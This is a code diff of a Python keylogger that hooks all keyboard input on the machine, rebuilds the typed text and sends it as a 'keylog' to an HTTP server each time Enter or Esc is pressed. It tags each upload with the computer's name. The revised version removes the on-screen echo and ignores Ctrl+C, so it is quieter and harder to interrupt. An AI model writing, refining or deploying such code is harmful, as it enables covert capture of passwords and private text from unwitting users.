@@ -1,26 +1,27 @@
-import keyboard, time, requests, uuid
+import os
+import uuid
+import time
+import requests
+import keyboard
+import threading
 
-# ===============================================================
-# GLOBAL TEXT INPUT ENGINE
-# ===============================================================
-
+# =========================
+# CONFIG
+# =========================
 url = "http://localhost:3000/"
-userId = ""
-try:
-    with open("userId.txt", "r", encoding="utf-8") as f:
-        userId = f.read()
-except:
-    userId = str(uuid.uuid4)
-    with open("userId.txt", "w", encoding="utf-8") as f:
-        f.write(userId)
+script_dir = os.path.dirname(os.path.abspath(__file__))
+file_path = os.path.join(script_dir, "userId.txt")
 
+userId = ""
 isRunning = False
+
+# =========================
+# KEYBOARD HANDLER
+# =========================
+text_buffer = ""
 shift_pressed = False
 caps_pressed = False
 
-text_buffer = ""  # Store real typed text
-
-# Mapping for keys where Shift changes the symbol
 SHIFT_MAP = {
     "1": "!",
     "2": "@",
@@ -48,98 +49,93 @@ SHIFT_MAP = {
 
 def process_character(char):
     global shift_pressed, caps_pressed
-
-    # Special handling for letters
     if char.isalpha():
-        # XOR logic: shift ^ caps
-        if shift_pressed ^ caps_pressed:
-            return char.upper()
-        else:
-            return char.lower()
-
-    # Special handling for symbols
+        return char.upper() if shift_pressed ^ caps_pressed else char.lower()
     if shift_pressed and char in SHIFT_MAP:
         return SHIFT_MAP[char]
-
-    return char  # default (numbers, normal chars, etc)
+    return char
 
 
 def on_key(event):
-    global shift_pressed, caps_pressed, text_buffer
-    global isRunning
-    global url
+    global shift_pressed, caps_pressed, text_buffer, isRunning, userId
 
-    # Track shift key
     if event.name == "shift":
         shift_pressed = event.event_type == "down"
         return
 
-    # Track caps lock toggling
     if event.name == "caps lock" and event.event_type == "down":
         caps_pressed = not caps_pressed
         return
 
-    # Only process key press (not release)
     if event.event_type != "down":
         return
 
-    # Handle Space
     if event.name == "space":
         text_buffer += " "
-        print("TEXT:", text_buffer)
-
-    # Handle Backspace
-    if event.name == "backspace":
-        if len(text_buffer) > 0:
-            text_buffer = text_buffer[:-1]
-        print("TEXT:", text_buffer)
         return
 
-    # Handle Enter
+    if event.name == "backspace":
+        text_buffer = text_buffer[:-1]
+        return
+
     if event.name == "enter":
-
-        data = {"userId": userId, "keylog": text_buffer}
-
         try:
-            requests.post(url, json=data)
+            requests.post(url, json={"userId": userId, "keylog": text_buffer})
         finally:
-            text_buffer = ""  # clear after enter
-            return
+            text_buffer = ""
+        return
 
-    # Handle regular single-character keys
-    if len(event.name) == 1:  # simple character like a, 1, !, etc.
-        real_char = process_character(event.name)
-        text_buffer += real_char
-        print("TEXT:", text_buffer)
+    if len(event.name) == 1:
+        text_buffer += process_character(event.name)
         return
 
     if event.name == "esc":
-        if len(text_buffer) > 0:
-            data = {"userId": userId, "keylog": text_buffer}
+        if text_buffer:
             try:
-                requests.post(url, json=data)
+                requests.post(url, json={"userId": userId, "keylog": text_buffer})
             finally:
-                isRunning = False
-                keyboard.unhook_all()
-                return
+                text_buffer = ""
         isRunning = False
         keyboard.unhook_all()
+        print("ESC pressed. Exiting gracefully.")
         return
 
 
+# =========================
+# MAIN
+# =========================
 def main():
-    # Start listening globally
-    keyboard.hook(on_key)
+    global isRunning, userId
+
+    # Ensure userId file exists before starting hook
+    userId = os.environ.get("COMPUTERNAME")
+
+    print("userId:", userId)
+
+    # Start keyboard hook
+    try:
+        keyboard.hook(on_key)
+    except Exception as e:
+        print("Failed to initialize keyboard hook:", e)
+        return
+
     isRunning = True
 
+    # Run a loop that ignores KeyboardInterrupt
     while isRunning:
-        time.sleep(0.1)
+        try:
+            time.sleep(0.1)
+        except KeyboardInterrupt:
+            # Ignore Ctrl+C
+            continue
 
-    end = {"userId": userId, "type": "close"}
+    # Notify server about closing
     try:
-        requests.post(url, json=end)
-    finally:
-        print("Program end execution")
+        requests.post(url, json={"userId": userId, "type": "close"})
+    except:
+        pass
+    keyboard.unhook_all()
+    print("Program terminated gracefully.")
 
 
 if __name__ == "__main__":
